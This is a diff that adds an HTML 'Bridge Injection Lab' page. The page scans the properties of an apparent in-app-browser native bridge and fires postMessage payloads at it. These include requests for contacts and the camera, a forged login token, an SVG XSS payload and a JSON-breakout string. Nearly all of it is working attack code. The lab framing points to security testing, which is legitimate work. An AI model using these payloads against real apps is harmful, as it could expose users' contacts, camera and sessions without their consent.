@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Advanced Bridge Injection Lab</title>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; background: #0d1117; color: #c9d1d9; padding: 20px; }
+        .card { background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 15px; margin-bottom: 20px; border-left: 4px solid #58a6ff; }
+        h3 { color: #58a6ff; margin-top: 0; }
+        .btn { display: inline-block; background: #21262d; color: #58a6ff; padding: 10px 15px; border: 1px solid #30363d; border-radius: 6px; margin: 5px 2px; cursor: pointer; font-weight: bold; }
+        .result-box { background: #010409; color: #7ee787; padding: 10px; border-radius: 6px; font-family: monospace; margin-top: 10px; border: 1px solid #30363d; min-height: 50px; }
+    </style>
+</head>
+<body>
+
+    <h2>Bridge Injection & postMessage Lab</h2>
+
+    <div class="card">
+        <h3>1. Bridge Property Scanner</h3>
+        <p>Check all properties of <code>iabjs_unified_bridge</code></p>
+        <button class="btn" onclick="scanBridgeProps()">Scan Bridge Properties</button>
+        <div id="scan-res" class="result-box">Click scan...</div>
+    </div>
+
+    <div class="card">
+        <h3>2. postMessage Fuzzing (Action Injection)</h3>
+        <p>Try sending different JSON structures to trigger native functions.</p>
+        <button class="btn" onclick="inject('{"action":"get_contacts"}')">Get Contacts?</button>
+        <button class="btn" onclick="inject('{"handler":"camera","method":"open"}')">Open Camera?</button>
+        <button class="btn" onclick="inject('{"type":"login","token":"hacked"}')">Inject Token</button>
+        <button class="btn" onclick="inject('ping')">Simple String Ping</button>
+    </div>
+
+    <div class="card">
+        <h3>3. Bridge XSS (Breaking the Parser)</h3>
+        <button class="btn" onclick="inject('<svg/onload=alert(document.domain)>')">SVG XSS</button>
+        <button class="btn" onclick="inject('{\"name\":\"' + String.fromCharCode(34) + ';alert(1)//\"}')">JSON Breakout</button>
+    </div>
+
+    <script>
+        // Scanner to list everything inside the bridge
+        function scanBridgeProps() {
+            let res = document.getElementById('scan-res');
+            try {
+                if (window.iabjs_unified_bridge) {
+                    let props = Object.getOwnPropertyNames(window.iabjs_unified_bridge);
+                    res.innerText = "Found Properties/Methods: \n" + props.join("\n");
+                } else {
+                    res.innerText = "Error: iabjs_unified_bridge not found.";
+                }
+            } catch(e) {
+                res.innerText = "Scan Failed: " + e;
+            }
+        }
+
+        // Generic Injection Function
+        function inject(payload) {
+            let res = document.getElementById('scan-res');
+            try {
+                window.iabjs_unified_bridge.postMessage(payload);
+                res.innerText = "Last Payload Sent: \n" + payload;
+                console.log("Injected: ", payload);
+            } catch(e) {
+                res.innerText = "Injection Error: " + e;
+            }
+        }
+    </script>
+</body>
+</html>
